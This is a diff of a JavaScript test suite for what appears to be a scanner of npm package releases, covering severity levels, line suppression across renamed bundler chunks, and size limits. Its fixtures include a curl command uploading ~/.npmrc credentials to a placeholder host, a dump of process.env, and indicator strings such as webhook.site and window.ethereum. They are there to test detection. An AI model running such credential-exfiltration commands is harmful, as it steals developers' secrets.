@@ -53,12 +53,12 @@ test('package.json-only dependency changes do not produce code-diff findings', a
     files({ 'package.json': '{"dependencies":{"fixture":"1"}}', 'index.js': 'export {};' }))), []);
 });
 
-test('load failures return one informational finding', async () => {
+test('target and baseline load failures return an incomplete comparison warning', async () => {
   for (const version of ['1.0.0', '2.0.0']) {
     const ctx = context(new Map());
     ctx.loadFiles = async requested => { if (requested === version) throw new Error('fixture unavailable'); return new Map(); };
-    assert.deepEqual(await signal.evaluate(ctx), [{ signal: 'code-diff', severity: 'info',
-      title: 'code comparison unavailable: fixture unavailable', evidence: [], weight: 0 }]);
+    assert.deepEqual(await signal.evaluate(ctx), [{ signal: 'code-diff', severity: 'warn',
+      title: 'Code comparison incomplete: fixture unavailable', evidence: [], weight: 15 }]);
   }
 });
 
@@ -80,7 +80,7 @@ test('new non-JS install entry points, native builds and binary payloads are sca
     '.claude/settings.json': '{}',
     '.vscode/tasks.json': '{}',
   }), new Map(), { install: 'sh "./setup.sh"' }));
-  assert.ok(result.some(finding => finding.severity === 'critical'));
+  assert.ok(result.some(finding => finding.severity === 'high'));
   for (const id of ['native-install', 'packed-payload', 'agent-autorun']) {
     assert.ok(result.some(finding => finding.evidence.some(item => item.includes(id))), id);
   }
@@ -94,35 +94,105 @@ test('existing install script does not escalate a changed file to critical', asy
   assert.equal(result[0].severity, 'warn');
 });
 
-test('new large minified JS and oversized files are reported without oversized scanning', async () => {
+test('large files report incomplete coverage and scan only their head and tail', async () => {
   const result = await signal.evaluate(context(files({
     'bundle.min.js': 'a'.repeat(501 * 1024),
-    'huge.js': `eval(fixture);${'a'.repeat(8 * 1024 * 1024)}`,
+    'huge.js': `eval(head);${'a'.repeat(3 * 1024 * 1024)};JSON.stringify(process.env);${'a'.repeat(3 * 1024 * 1024)};eval(tail);`,
   })));
   // A new minified bundle alone is weak evidence (generated parsers, vendored code).
   assert.ok(!result.some(finding => finding.severity === 'high' || finding.severity === 'critical'));
   assert.ok(result.some(finding => finding.evidence.some(item => item.includes('large-minified-file'))));
-  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('oversized-file'))));
-  assert.ok(!result.some(finding => finding.evidence.some(item => item.includes('[eval]'))));
+  assert.ok(result.some(finding => finding.title === 'Code comparison incomplete: huge.js too large to scan completely' && finding.weight === 15));
+  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('eval(head)'))));
+  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('eval(tail)'))));
+  assert.ok(!result.some(finding => finding.title.includes('credentials')));
 });
 
 test('aggregation caps evidence per category and keeps critical evidence visible', async () => {
   const entries = Object.fromEntries(Array.from({ length: 8 }, (_, index) => [`file${index}.js`, 'eval(fixture)']));
-  entries['last.js'] = 'eval(fixture)';
+  entries['last.js'] = 'eval(fixture); JSON.stringify(process.env)';
   const result = await signal.evaluate(context(files(entries), new Map(), { postinstall: 'node last.js' }));
-  assert.equal(result.length, 1);
+  assert.equal(result.length, 2);
   assert.equal(result[0].severity, 'critical');
   assert.equal(result[0].evidence.length, 5);
   assert.ok(result[0].evidence[0].startsWith('last.js:'));
   for (const finding of result) assert.equal(finding.weight, SEVERITY_WEIGHT[finding.severity]);
 });
 
-test('patterns the previous release already had anywhere are not new (renamed bundler chunks)', async () => {
+test('identical source lines in renamed bundler chunks are suppressed', async () => {
   const result = await signal.evaluate(context(
     files({ 'dist/chunk.B2.js': "import { spawn } from 'node:child_process'; const deny = ['.npmrc'];" }),
     files({ 'dist/chunk.A1.js': "import { spawn } from 'node:child_process'; const deny = ['.npmrc'];" }),
   ));
   assert.deepEqual(result, []);
+});
+
+test('old harmless patterns do not suppress a newly added credential upload line', async () => {
+  const baseline = "require('child_process');\nconst deny = ['.npmrc'];";
+  for (const target of [
+    files({ 'index.js': baseline + "\nexec('curl -T ~/.npmrc https://x');" }),
+    files({ 'index.js': baseline, 'payload.js': "require('child_process');\nexec('curl -T ~/.npmrc https://x');" }),
+  ]) {
+    const result = await signal.evaluate(context(target, files({ 'index.js': baseline })));
+    assert.ok(result.some(f => f.title.includes('credentials') && f.severity === 'high'
+      && f.evidence.some(line => line.includes('.npmrc https://x'))));
+  }
+});
+
+test('trimmed lines and 160-character windows survive bundler renames', async () => {
+  const code = '/*' + 'a'.repeat(800) + "*/require('child_process'); const deny = ['.npmrc'];/*" + 'b'.repeat(800) + '*/';
+  assert.deepEqual(await signal.evaluate(context(files({ 'new.js': 'changed prefix;' + code }),
+    files({ 'old.js': code }))), []);
+  assert.deepEqual(await signal.evaluate(context(files({ 'new.js': "  require('child_process');  " }),
+    files({ 'old.js': "require('child_process');" }))), []);
+});
+
+test('a new install reference bypasses suppression but plain exec alone stays high', async () => {
+  for (const command of ['node --version', 'node-gyp rebuild', 'prebuild-install']) {
+    const code = `require('child_process').execSync('${command}');`;
+    const result = await signal.evaluate(context(files({ 'setup.js': code }), files({ 'old.js': code }),
+      { install: 'node setup.js' }));
+    assert.equal(result.length, 1);
+    assert.equal(result[0].severity, 'high');
+    assert.equal(result[0].weight, 35);
+  }
+});
+
+test('new files referenced by an unchanged install script also bypass line suppression', async () => {
+  const code = "require('child_process').execSync('node --version');";
+  const scripts = { install: 'node setup.js' };
+  const result = await signal.evaluate(context(files({ 'setup.js': code }), files({ 'old.js': code }), scripts, scripts));
+  assert.ok(result.some(f => f.evidence.some(line => line.startsWith('setup.js:'))));
+});
+
+test('a new install reference with dangerous categories still escalates to critical', async () => {
+  for (const code of ["require('child_process'); read('.npmrc');", 'webhook.site',
+    'SessionStart', '.bashrc', 'window.ethereum', '_0xabcdef;'.repeat(25)]) {
+    const result = await signal.evaluate(context(files({ 'setup.js': code }), new Map(), { install: 'node setup.js' }));
+    assert.ok(result.length > 0);
+    assert.ok(result.every(f => f.severity === 'critical'), code);
+  }
+});
+
+test('release scan budget covers baseline and target and reports skipped files once', async () => {
+  const chunk = Buffer.from((' '.repeat(127) + '\n').repeat(1024 * 1024 / 128));
+  const target = new Map(Array.from({ length: 15 }, (_, i) => [`new${i}.js`, chunk]));
+  const baseline = new Map(Array.from({ length: 10 }, (_, i) => [`old${i}.js`, chunk]));
+  const result = await signal.evaluate(context(target, baseline));
+  assert.deepEqual(result, [{ signal: 'code-diff', severity: 'warn', weight: 15,
+    title: 'Code comparison incomplete: code scan budget exceeded, 1 files not scanned', evidence: [] }]);
+});
+
+test('first-release and baseline oversized coverage warnings retain weight 15', async () => {
+  const huge = Buffer.from((' '.repeat(127) + '\n').repeat(3 * 1024 * 1024 / 128));
+  const first = context(files({ 'huge.js': huge }));
+  first.baseline = [];
+  const result = await signal.evaluate(first);
+  assert.equal(result.length, 1);
+  assert.equal(result[0].severity, 'warn');
+  assert.equal(result[0].weight, 15);
+  const baselineResult = await signal.evaluate(context(files({ 'index.js': 'export {};' }), files({ 'old.js': huge })));
+  assert.ok(baselineResult.some(f => f.title.includes('old.js too large') && f.weight === 15));
 });
 
 test('a credential path next to process execution in a new file is high', async () => {
